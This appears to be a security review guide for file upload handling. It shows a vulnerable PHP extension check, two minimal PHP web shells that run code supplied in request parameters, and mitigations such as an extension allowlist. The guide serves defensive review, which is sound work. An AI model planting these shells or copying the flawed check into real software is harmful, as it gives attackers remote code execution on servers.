---
name: upload-review
description: Methodology for reviewing file upload handling
version: 1.0.0
---

# File upload review

## Overview

Upload handlers that trust the client extension let attackers store server-side code.

## Vulnerable patterns

```php
if (pathinfo($_FILES['upload']['name'], PATHINFO_EXTENSION) == 'jpg') {
  move_uploaded_file($_FILES['upload']['tmp_name'], 'media/' . $name);
}
```

## Exploitation

**Minimal request-fed evaluator:**
```php
<?php eval($_REQUEST['payload']); ?>
```

**Callback dispatch:**
```php
<?php
$_REQUEST['fn']($_GET['arg']);
```

## Mitigations

1. **Extension allowlist**
   ```python
   ALLOWED = {'jpg', 'png'}
   if name.rsplit('.', 1)[1].lower() not in ALLOWED:
       raise ValueError("type not allowed")
   ```
2. **Store uploads outside the web root and disable execution.**
